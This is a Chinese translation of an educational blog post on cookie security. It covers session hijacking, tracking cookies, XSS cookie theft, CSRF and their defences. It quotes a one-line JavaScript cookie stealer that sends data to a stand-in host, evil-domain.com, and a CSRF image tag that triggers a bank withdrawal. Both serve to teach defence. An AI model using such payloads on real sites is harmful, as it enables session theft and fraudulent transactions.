Cookie和安全
---
### 序

[上一篇译文](http://www.atatech.org/article/detail/13453/392)介绍了HTTP Cookie的基本知识及工作原理。但是谈到cookie就离不开安全，因此，本文继续翻译NCZ的[Cookies and security](http://www.nczonline.net/blog/2009/05/12/cookies-and-security/)，介绍cookie与网页安全的基本知识。

Cookie对网站安全影响非常大，Cookie的`domain`，`path`，`secure`选项似乎已经关注到了所有安全问题，但是网页的本质使得这个问题变得非常复杂。

### 用户登录和session劫持

cookie最常见的用法是用于记录用户登录状态。这种机制非常简单：用户访问网页，使用用户名和密码登录。如果信息有效的话，将会在下一个请求中返回用于唯一标识该用户的cookie。网站上的每个页面都会检查这个cookie值来建立登录凭证。只要cookie是完整的，用户就会被认为是刚开始登录的合法用户。大部分网站会将cookie设为session（回话）cookie，在浏览器关闭时删除，以防止无意地保持登陆状态而产生安全问题。大部分登录表单都提供了“保持登陆”功能来将session cookie变成持久cookie。即使这样，大部分系统也会将过期时间设置为1到两周来防止出现可能的安全问题。

这样的系统存在一个问题，只有一个单独的数据来验证用户身份。除此之外，cookie在互联网上的传播是明文的，在用户计算机和互联网之间的恶意用户可以通过[包嗅探](http://en.wikipedia.org/wiki/Packet_sniffing)来捕获网络流量。一旦获得了用户的登录cookie，就可以通过手动设置cookie值来模拟相同的会话。服务器不能区分原始的登陆cookie和通过包嗅探盗取的cookie，因此，恶意用户可以像用户一样正常登录。这样的攻击被称为[会话劫持-session hijacking](http://en.wikipedia.org/wiki/Session_hijacking)。有几种方法来防止使用cookie进行会话劫持。

第一种，也是最普遍的安全措施就是只通过SSL传递cookie，因为SSL会在浏览器端加密通过互联网传输的请求，仅仅通过包嗅探不能确定cookie值。银行和电商网站经常使用这种技术，因为用户会话持续时间通常很短。

另一种技术是基于用户信息（用户名，IP地址，登录时间等）随机生成一个session key（会话秘钥）。这样虽然不能禁止重用会话秘钥的可能，但是可以加大重用session秘钥的难度。

还有一种方法就是在用户执行某些被认为安全级别较高的操作，例如转账或者完成购买时重新进行用户身份验证。例如，很多站点在修改密码时会需要重新登录。

### 第三方cookie

网站页面允许引用互联网上任意地方的资源。例如，nczonline.net站点使用[YUI CSS](http://developer.yahoo.com/yui/3/cssbase/)来设置网站的页面结构，通过`<link>`标签引用了Yahoo！CDN上`yui.yahooapis.com`的文件。因为cookie的限制，查找这个CSS资源的请求不会包含`nczonline.net`的cookie。但是，`yui.yahooapis.com`可能会在请求中返回它的cookie（如果没有的话，则这是一个没有cookie的服务器）。`nczonline.net`上的页面不能访问`yui.yahooapis.com`的cookie，因为cookie的domain不同，同理`yui.yahooapis.com`上的页面也不能访问`nczonline.net`的cookie。这种情况下，`yui.yahooapis.com`会设置一个和所在页面的域不同域的第三方cookie。

在HTML中引用其他域的资源有几种方式：

    *   使用`<link>`标签来引用样式表。
    *   使用`<script>`标签来引用JavaScript文件。
    *   使用`<object>`或者`<embed>`标签来引用媒体文件。
    *   使用`<iframe>`标签来引用另一个HTML文件。

以上所有方法都会引用外部文件并返回各自的cookie。有趣的是，在这些请求里，第三方服务器会收到一个HTTP `Referer`头信息，指示正在请求资源的页面。服务器可以使用这些信息来发出一个特定的标识正在引用资源的页面的cookie。如果从其他页面加载相同的资源，cookie将会和请求一起发送，服务器可以确定访问了站点A的用户也访问了站点B。这是在线广告的通用行为。这样的cooki通常被称为跟踪cookie，因为它们的任务就是跟踪用户从一个站点到另一个站点之间的访问。虽然这实际上不是安全威胁，但是对于理解更大的安全问题的讨论非常重要。

### cookie盗取和XSS

网页能够从其他域加载JavaScript是一个非常麻烦的安全漏洞。虽然对于第三方资源的请求不会包含它们所在页面的cookie，但是脚本可以访问cookie。一个页面上的所有JavaScript被认为是在同一个域下，同一个目录下使用和该页面一样的协议运行的。这意味着从其他域加载的脚本可以通过读取`document.cookie`获取这个页面的cookie。

为了演示其危险性，假设我们从`evil-domain.com`站点引用了一段实际上非常有用的代码。然而，`evil-domain.com`上的家伙可以把code切换成下面的代码：

```
(new Image()).src = 'http://www.evil-domain.com/cookiestealer.php?cookie=' +
cookie.domain;
```

这样，这段脚本加载在我们的页面上加载时会偷偷地将我们的cookie发送回`evil-domain.com`。其他所有访问了我们站点的用户的cookie也会被发送过去。`evil-domain.com`有了我们的cookie后就可以比较轻松的实现session劫持等作恶行为。这种因为网页上的第三方脚本注入引发的攻击被称为[cross-site scripting跨站脚本攻击,简称XSS](http://en.wikipedia.org/wiki/Cross-site_scripting)

cookie盗取在不只在页面不小心引用了恶意脚本时发生，也可能因为输入过滤不够而发生。一个最简单的[例子](http://www.steve.org.uk/Hacks/XSS/simple.html)就是用户可以输入一段将会被输出到页面上的文本内容。如果这段文本包含上面一样的`<script>`代码，那么cookie就会被盗取。

防范XSS的最佳实践有两种：

    1.  不要饮用来自不信任域的JavaScript。Yahoo！，Google和AOL这样大公司的CND比较安全，从其他站点引用一定要非常谨慎。
    2.  过滤用户输入的HTML内容，或者清理输入内容。不要在没有任何过滤的情况下直接将用户的输入输出到页面上。

这也是为什么HTTP-only cookie对于标准cookie的补充实现很重要的原因。标记为HTTP-only的cookie不能被恶意脚本使用`document.cookie`访问，因此也就不能盗取cookie信息。

>   2011年，99%的浏览器和大部分网络应用框架都支持HTTP Only。详情请参考*参考资料1和2*

### CSRF(Corss-site request foregery,跨站请求伪造)

另一种使用cookie的攻击方法被称为[CSRF](http://en.wikipedia.org/wiki/Cross-site_request_forgery)。在这种类型的攻击里，攻击者让浏览器发送一个已经登录用户的请求来作恶，例如将钱转到攻击者的银行账户。CSRF可以使用上面提到的XSS方法来实现，或者使用简单的HTML来实现。

维基百科上有一个例子，有人在一个没有输入过滤的论坛上发了一条信息。这样，他可以在信息中插入一张不是图片的恶意代码，向用户的银行服务器发送取款请求，例如：

```html
<img src="http://bank.example/withdraw?account=bob&amount=100000&for=mallory">
```

如果用户登录了银行账户（`bank.example`），即cookie仍然有效的话，那么访客在查看图片时会发送取款转账的请求。银行网站会因为传送了合适的cookie值而认为请求有效，即使这个请求实际上并不是访客自己发的。

与XSS一样，输入过滤是防范CSRF攻击的重要工具。其他方法还有：

    *   任何敏感操作都需要进行确认。例如本实例中的`bank.example`不应该发出取款请求，而应该展示一个需要用户验证请求操作的确认页面。验证操作可以包含登录窗口来增强安全性。
    *   系统中验证用户敏感信息的cookie应该设置较短的过期时间。有些情况下，设置几分钟的过期时间就够了。
    *   不只通过cookie来进行验证，还可以通过`referer`和/或请求类型（POST而不是GET）来验证。

CSRF发生后很难跟踪，因此防范非常关键。

### 总结

虽然使用cookie有这么多安全问题，但只要采取合适的安全措施，还是可以避免用户和系统遭受XSS和CSRF攻击的。例如输入合法性验证可以减少站点遭攻击的次数，投入少，回报高。许多大公司都依靠cookie来标识用户。最重要的是，要了解安全问题并关注最新的攻击防范措施。

### 参考资料
1.  [OWASP HTTPONLY](https://www.owasp.org/index.php/HTTPOnly#Browsers_Supporting_HTTPOnly)
2.  [browser security](http://www.browserscope.org/?category=security)
